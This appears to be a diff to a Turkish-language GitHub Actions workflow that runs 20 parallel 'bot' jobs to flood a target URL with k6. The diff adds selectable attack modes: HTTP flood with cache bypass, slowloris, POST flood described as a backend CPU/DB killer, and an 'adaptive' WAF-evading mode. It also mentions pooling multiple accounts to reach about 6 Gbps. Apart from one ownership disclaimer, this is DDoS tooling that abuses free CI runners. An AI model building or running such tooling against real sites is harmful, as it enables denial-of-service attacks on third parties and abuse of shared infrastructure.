@@ -2,9 +2,18 @@
 # 🔥 Distributed Load Test — 20 Paralel Runner
 #
 # Manuel tetiklenir (workflow_dispatch)
-# Actions sekmesinden URL, süre, VU parametreleri girilir
-# 20 paralel job spawn olur, her biri k6 çalıştırır
-# Toplam: ~130.000 req/s / ~3 Gbps
+# Actions sekmesinden URL, süre, VU, ATTACK MODE parametreleri girilir
+# 20 paralel job spawn olur, her biri seçilen k6 script'ini çalıştırır
+#
+# Toplam: ~130.000 req/s / ~3 Gbps (flood modu, tek hesap)
+# Multi-account (Forest + Stranic): ~260.000 req/s / ~6 Gbps
+#
+# ATTACK MODES:
+#   flood     → k6-flood-http.js    (super-flood, cache bypass, multi-endpoint)
+#   slowloris → k6-slowloris.js     (connection pool tüketici)
+#   post      → k6-post-flood.js    (backend CPU/DB killer)
+#   adaptive  → k6-adaptive.js      (response-aware, WAF evader)
+#   legacy    → k6-script.js        (eski basit script — geriye uyumluluk)
 #
 # YALNIZCA KENDİ SAHİBİ OLDUĞUNUZ SİSTEMLERE YAPIN
 # ================================================================
@@ -15,19 +24,19 @@ on:
   workflow_dispatch:
     inputs:
       target_url:
-        description: 'Hedef URL (https://ornek.com)'
+        description: 'Hedef URL (https://ornek.com veya http://IP:PORT)'
         required: true
         default: 'https://hhh.frostai.com.tr'
         type: string
       duration:
-        description: 'Test süresi (örn: 60s, 3m, 5m)'
+        description: 'Test süresi (örn: 60s, 3m, 5m, 15m)'
         required: true
         default: '60s'
         type: string
       vus_per_runner:
-        description: 'Her runner başına VU sayısı (max 500)'
+        description: 'Her runner başına VU sayısı (max 5000)'
         required: true
-        default: '200'
+        default: '300'
         type: string
       rps_per_runner:
         description: 'Her runner başına hedef RPS (0 = maksimum)'
@@ -44,12 +53,23 @@ on:
         required: false
         default: ''
         type: string
+      attack_mode:
+        description: 'Saldırı türü'
+        required: true
+        default: 'flood'
+        type: choice
+        options:
+          - flood
+          - slowloris
+          - post
+          - adaptive
+          - legacy
 
 jobs:
   loadtest:
     name: bot-${{ matrix.bot_id }}
     runs-on: ubuntu-latest
-    timeout-minutes: 15
+    timeout-minutes: 30
 
     strategy:
       fail-fast: false
@@ -61,10 +81,12 @@ jobs:
         run: |
           echo "═══════════════════════════════════════"
           echo "  BOT #${{ matrix.bot_id }} baslatiliyor"
-          echo "  Hedef: ${{ inputs.target_url }}"
-          echo "  Süre : ${{ inputs.duration }}"
-          echo "  VU   : ${{ inputs.vus_per_runner }}"
-          echo "  RPS  : ${{ inputs.rps_per_runner }}"
+          echo "  Hedef  : ${{ inputs.target_url }}"
+          echo "  Mode   : ${{ inputs.attack_mode }}"
+          echo "  Süre   : ${{ inputs.duration }}"
+          echo "  VU     : ${{ inputs.vus_per_runner }}"
+          echo "  RPS    : ${{ inputs.rps_per_runner }}"
+          echo "  Host   : ${{ inputs.host_header }}"
           echo "  Runner IP: $(curl -s ifconfig.me)"
           echo "═══════════════════════════════════════"
 
@@ -96,11 +118,47 @@ jobs:
           sudo sysctl -w net.ipv4.tcp_tw_reuse=1
           # FIN timeout kisalt
           sudo sysctl -w net.ipv4.tcp_fin_timeout=15
+          # SYN backlog
+          sudo sysctl -w net.core.somaxconn=65535
+          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65535
           # File descriptor limit
-          ulimit -n 65535
+          ulimit -n 1048576 || ulimit -n 65535
           echo "OS ayarlari yapildi"
 
-      - name: 🔥 Run k6 Load Test
+      - name: 🎯 Select k6 Script
+        if: matrix.bot_id <= fromJson(inputs.parallel_jobs)
+        id: script_select
+        run: |
+          MODE="${{ inputs.attack_mode }}"
+          case "$MODE" in
+            flood)
+              echo "script=.github/workflows/k6-flood-http.js" >> $GITHUB_OUTPUT
+              echo "mode_desc=SUPER FLOOD (multi-endpoint cache-bypass)" >> $GITHUB_OUTPUT
+              ;;
+            slowloris)
+              echo "script=.github/workflows/k6-slowloris.js" >> $GITHUB_OUTPUT
+              echo "mode_desc=SLOWLORIS (connection pool exhaustion)" >> $GITHUB_OUTPUT
+              ;;
+            post)
+              echo "script=.github/workflows/k6-post-flood.js" >> $GITHUB_OUTPUT
+              echo "mode_desc=POST FLOOD (backend CPU/DB killer)" >> $GITHUB_OUTPUT
+              ;;
+            adaptive)
+              echo "script=.github/workflows/k6-adaptive.js" >> $GITHUB_OUTPUT
+              echo "mode_desc=ADAPTIVE (response-aware auto-tuning)" >> $GITHUB_OUTPUT
+              ;;
+            legacy)
+              echo "script=.github/workflows/k6-script.js" >> $GITHUB_OUTPUT
+              echo "mode_desc=LEGACY (basit GET flood)" >> $GITHUB_OUTPUT
+              ;;
+            *)
+              echo "script=.github/workflows/k6-flood-http.js" >> $GITHUB_OUTPUT
+              echo "mode_desc=DEFAULT flood" >> $GITHUB_OUTPUT
+              ;;
+          esac
+          echo "Selected: $MODE"
+
+      - name: 🔥 Run k6 Load Test (LIVE OUTPUT)
         if: matrix.bot_id <= fromJson(inputs.parallel_jobs)
         env:
           TARGET_URL: ${{ inputs.target_url }}
@@ -109,16 +167,46 @@ jobs:
           RPS: ${{ inputs.rps_per_runner }}
           BOT_ID: ${{ matrix.bot_id }}
           HOST_HEADER: ${{ inputs.host_header }}
+          # k6 log opsiyonlari: her 5 saniyede periodik progress
+          K6_LOG_OUTPUT: stdout
         run: |
           mkdir -p reports
-          k6 run \
-            --vus $VUS \
-            --duration $DURATION \
-            --rps $([[ "$RPS" -gt 0 ]] && echo "$RPS" || echo "1000000") \
-            --tag bot_id=$BOT_ID \
-            --summary-export=reports/bot-${BOT_ID}-summary.json \
-            --out json=reports/bot-${BOT_ID}-raw.json \
-            .github/workflows/k6-script.js
+          SCRIPT="${{ steps.script_select.outputs.script }}"
+          echo "▶ Running: $SCRIPT"
+          echo "▶ Mode: ${{ steps.script_select.outputs.mode_desc }}"
+          echo ""
+          echo "═══════════════════════════════════════════════════════════════"
+          echo "  CANLI DURUM (her ~5s'de [LIVE bot=$BOT_ID] satiri gelir)"
+          echo "  Ayrica k6 kendi progress log'unu da 30s'de bir basar"
+          echo "═══════════════════════════════════════════════════════════════"
+          echo ""
+
+          # stdbuf -oL: line-buffered stdout (log satirlari canli aksin)
+          # --console-output=stdout: k6 console.log stdout'a
+          # --verbose: k6 kendi periyodik istatistiklerini ver
+          if [[ "${{ inputs.attack_mode }}" == "legacy" ]]; then
+            RPS_ARG=$([[ "$RPS" -gt 0 ]] && echo "--rps $RPS" || echo "")
+            stdbuf -oL -eL k6 run \
+              --no-color \
+              --console-output=stdout \
+              --vus $VUS \
+              --duration $DURATION \
+              $RPS_ARG \
+              --tag bot_id=$BOT_ID \
+              --summary-export=reports/bot-${BOT_ID}-summary.json \
+              "$SCRIPT" || echo "k6 exited with code $?"
+          else
+            stdbuf -oL -eL k6 run \
+              --no-color \
+              --console-output=stdout \
+              --tag bot_id=$BOT_ID \
+              --summary-export=reports/bot-${BOT_ID}-summary-cli.json \
+              "$SCRIPT" || echo "k6 exited with code $?"
+          fi
+
+          echo ""
+          echo "═══ Bot #$BOT_ID artifact dosyaları ═══"
+          ls -la reports/ || true
 
       - name: 📊 Upload results
         if: always() && matrix.bot_id <= fromJson(inputs.parallel_jobs)
@@ -127,6 +215,7 @@ jobs:
           name: bot-${{ matrix.bot_id }}-results
           path: reports/
           retention-days: 7
+          if-no-files-found: warn
 
   aggregate:
     name: 📈 Toplu Rapor
@@ -139,52 +228,148 @@ jobs:
         uses: actions/download-artifact@v4
         with:
           path: all-results/
+        continue-on-error: true
 
       - name: 🧮 Aggregate metrics
         run: |
-          echo "═══════════════════════════════════════════════════════"
-          echo "  DISTRIBUTED LOAD TEST — TOPLU SONUÇ"
-          echo "  Hedef: ${{ inputs.target_url }}"
-          echo "  Süre : ${{ inputs.duration }}"
-          echo "  Bot  : ${{ inputs.parallel_jobs }}"
-          echo "═══════════════════════════════════════════════════════"
+          echo "╔═════════════════════════════════════════════════════════╗"
+          echo "║  📊 DISTRIBUTED LOAD TEST — TOPLU SONUÇ                 ║"
+          echo "╠═════════════════════════════════════════════════════════╣"
+          echo "║  Hedef       : ${{ inputs.target_url }}"
+          echo "║  Attack mode : ${{ inputs.attack_mode }}"
+          echo "║  Süre        : ${{ inputs.duration }}"
+          echo "║  Paralel bot : ${{ inputs.parallel_jobs }}"
+          echo "║  Host header : ${{ inputs.host_header }}"
+          echo "╚═════════════════════════════════════════════════════════╝"
+          echo ""
 
           total_reqs=0
-          total_fail=0
-          total_bytes=0
+          total_fail_reqs=0
+          total_bytes_in=0
+          total_bytes_out=0
+          total_2xx_rate=0
+          total_4xx_rate=0
+          total_5xx_rate=0
+          total_429_rate=0
+          bot_count=0
+          missing_bots=""
 
-          for f in all-results/*/bot-*-summary.json; do
-            [ -f "$f" ] || continue
-            reqs=$(jq -r '.metrics.http_reqs.count // .metrics.http_reqs.values.count // 0' "$f")
-            fails=$(jq -r '.metrics.http_req_failed.rate // .metrics.http_req_failed.values.rate // 0' "$f")
-            bytes=$(jq -r '.metrics.data_received.count // .metrics.data_received.values.count // 0' "$f")
-            echo "  → $(basename $(dirname $f)): $reqs istek, ${bytes} byte"
-            total_reqs=$((total_reqs + ${reqs%.*}))
-            total_bytes=$((total_bytes + ${bytes%.*}))
+          # p95/p99 için toplama
+          sum_p95=0
+          sum_p99=0
+
+          # Beklenen bot listesi
+          expected_bots="${{ inputs.parallel_jobs }}"
+
+          for i in $(seq 1 $expected_bots); do
+            f="all-results/bot-${i}-results/bot-${i}-summary.json"
+            f_alt="all-results/bot-${i}-results/bot-${i}-summary-cli.json"
+
+            if [ ! -f "$f" ]; then
+              # Fallback CLI dosyası
+              if [ -f "$f_alt" ]; then
+                f="$f_alt"
+              else
+                missing_bots="$missing_bots $i"
+                continue
+              fi
+            fi
+
+            bot_count=$((bot_count + 1))
+
+            # Metric extraction (k6 v0.42+ format ile fallback)
+            reqs=$(jq -r '(.metrics.http_reqs.count // .metrics.http_reqs.values.count // 0) | floor' "$f" 2>/dev/null || echo "0")
+            bytes_in=$(jq -r '(.metrics.data_received.count // .metrics.data_received.values.count // 0) | floor' "$f" 2>/dev/null || echo "0")
+            bytes_out=$(jq -r '(.metrics.data_sent.count // .metrics.data_sent.values.count // 0) | floor' "$f" 2>/dev/null || echo "0")
+            fail_rate=$(jq -r '(.metrics.http_req_failed.rate // .metrics.http_req_failed.values.rate // 0)' "$f" 2>/dev/null || echo "0")
+            r2xx=$(jq -r '(.metrics.rate_2xx.rate // .metrics.rate_2xx.values.rate // 0)' "$f" 2>/dev/null || echo "0")
+            r4xx=$(jq -r '(.metrics.rate_4xx.rate // .metrics.rate_4xx.values.rate // 0)' "$f" 2>/dev/null || echo "0")
+            r5xx=$(jq -r '(.metrics.rate_5xx.rate // .metrics.rate_5xx.values.rate // 0)' "$f" 2>/dev/null || echo "0")
+            r429=$(jq -r '(.metrics.rate_429.rate // .metrics.rate_429.values.rate // 0)' "$f" 2>/dev/null || echo "0")
+            p95=$(jq -r '(.metrics.http_req_duration["p(95)"] // .metrics.http_req_duration.values["p(95)"] // 0)' "$f" 2>/dev/null || echo "0")
+            p99=$(jq -r '(.metrics.http_req_duration["p(99)"] // .metrics.http_req_duration.values["p(99)"] // 0)' "$f" 2>/dev/null || echo "0")
+
+            reqs=${reqs%.*}
+            bytes_in=${bytes_in%.*}
+            bytes_out=${bytes_out%.*}
+
+            printf "  Bot #%2d → istek: %10d  |  data: %8s MB  |  fail: %5s%%  |  p95: %6sms\n" \
+              "$i" "$reqs" "$((bytes_in / 1024 / 1024))" \
+              "$(echo "$fail_rate * 100" | bc -l 2>/dev/null | xargs printf '%.1f' 2>/dev/null || echo 'N/A')" \
+              "$(printf '%.0f' "$p95" 2>/dev/null || echo 'N/A')"
+
+            total_reqs=$((total_reqs + reqs))
+            total_bytes_in=$((total_bytes_in + bytes_in))
+            total_bytes_out=$((total_bytes_out + bytes_out))
+
+            total_2xx_rate=$(echo "$total_2xx_rate + $r2xx" | bc -l 2>/dev/null || echo "$total_2xx_rate")
+            total_4xx_rate=$(echo "$total_4xx_rate + $r4xx" | bc -l 2>/dev/null || echo "$total_4xx_rate")
+            total_5xx_rate=$(echo "$total_5xx_rate + $r5xx" | bc -l 2>/dev/null || echo "$total_5xx_rate")
+            total_429_rate=$(echo "$total_429_rate + $r429" | bc -l 2>/dev/null || echo "$total_429_rate")
+            sum_p95=$(echo "$sum_p95 + $p95" | bc -l 2>/dev/null || echo "$sum_p95")
+            sum_p99=$(echo "$sum_p99 + $p99" | bc -l 2>/dev/null || echo "$sum_p99")
           done
 
           echo ""
-          echo "═══════════════════════════════════════════════════════"
-          echo "  📊 GENEL TOPLAM"
-          echo "═══════════════════════════════════════════════════════"
-          echo "  Toplam istek     : $total_reqs"
-          echo "  Toplam data      : $((total_bytes / 1024 / 1024)) MB"
-          echo "  Toplam data      : $((total_bytes / 1024 / 1024 / 1024)) GB"
+          echo "╔═════════════════════════════════════════════════════════╗"
+          echo "║  📊 GENEL TOPLAM                                        ║"
+          echo "╚═════════════════════════════════════════════════════════╝"
+          echo "  Rapor gelen bot  : $bot_count / $expected_bots"
 
-          # Süre saniye çevir (60s, 3m gibi)
+          if [ -n "$missing_bots" ]; then
+            echo "  ⚠️  Rapor gelmeyen botlar:$missing_bots"
+            echo "     (Timeout ya da hata olabilir — logları kontrol edin)"
+          fi
+
+          echo ""
+          echo "  Toplam istek     : $total_reqs"
+          echo "  Toplam data (in) : $((total_bytes_in / 1024 / 1024)) MB / $((total_bytes_in / 1024 / 1024 / 1024)) GB"
+          echo "  Toplam data (out): $((total_bytes_out / 1024 / 1024)) MB"
+
+          # Süre saniye çevir
           duration_input="${{ inputs.duration }}"
           if [[ "$duration_input" == *m ]]; then
             duration_sec=$((${duration_input%m} * 60))
+          elif [[ "$duration_input" == *h ]]; then
+            duration_sec=$((${duration_input%h} * 3600))
           elif [[ "$duration_input" == *s ]]; then
             duration_sec=${duration_input%s}
           else
             duration_sec=60
           fi
 
-          if [ $duration_sec -gt 0 ]; then
+          if [ $duration_sec -gt 0 ] && [ $total_reqs -gt 0 ]; then
             rps=$((total_reqs / duration_sec))
-            gbps=$(echo "scale=2; $total_bytes * 8 / $duration_sec / 1000000000" | bc)
-            echo "  Ortalama RPS     : $rps req/s"
-            echo "  Ortalama Bandwidth: $gbps Gbps"
+            gbps=$(echo "scale=3; $total_bytes_in * 8 / $duration_sec / 1000000000" | bc)
+            mbps=$(echo "scale=1; $total_bytes_in * 8 / $duration_sec / 1000000" | bc)
+            echo ""
+            echo "  ⚡ Ortalama RPS     : $rps req/s"
+            echo "  ⚡ Ortalama Bandwidth: $mbps Mbps ($gbps Gbps)"
           fi
-          echo "═══════════════════════════════════════════════════════"
+
+          if [ $bot_count -gt 0 ]; then
+            avg_2xx=$(echo "scale=1; $total_2xx_rate * 100 / $bot_count" | bc -l 2>/dev/null || echo "N/A")
+            avg_4xx=$(echo "scale=1; $total_4xx_rate * 100 / $bot_count" | bc -l 2>/dev/null || echo "N/A")
+            avg_5xx=$(echo "scale=1; $total_5xx_rate * 100 / $bot_count" | bc -l 2>/dev/null || echo "N/A")
+            avg_429=$(echo "scale=1; $total_429_rate * 100 / $bot_count" | bc -l 2>/dev/null || echo "N/A")
+            avg_p95=$(echo "scale=0; $sum_p95 / $bot_count" | bc -l 2>/dev/null || echo "N/A")
+            avg_p99=$(echo "scale=0; $sum_p99 / $bot_count" | bc -l 2>/dev/null || echo "N/A")
+
+            echo ""
+            echo "  ┌─── Response Code Dağılımı ────────────┐"
+            echo "  │  2xx (başarılı)     : ${avg_2xx}%"
+            echo "  │  4xx (client error) : ${avg_4xx}%"
+            echo "  │  5xx (server error) : ${avg_5xx}%"
+            echo "  │  429 (rate limit)   : ${avg_429}%"
+            echo "  └────────────────────────────────────────┘"
+            echo ""
+            echo "  ┌─── Response Time (bots avg) ──────────┐"
+            echo "  │  p95 : ${avg_p95} ms"
+            echo "  │  p99 : ${avg_p99} ms"
+            echo "  └────────────────────────────────────────┘"
+          fi
+
+          echo ""
+          echo "╔═════════════════════════════════════════════════════════╗"
+          echo "║  Test tamamlandi. Detaylar icin bot job'larini inceleyin.║"
+          echo "╚═════════════════════════════════════════════════════════╝"
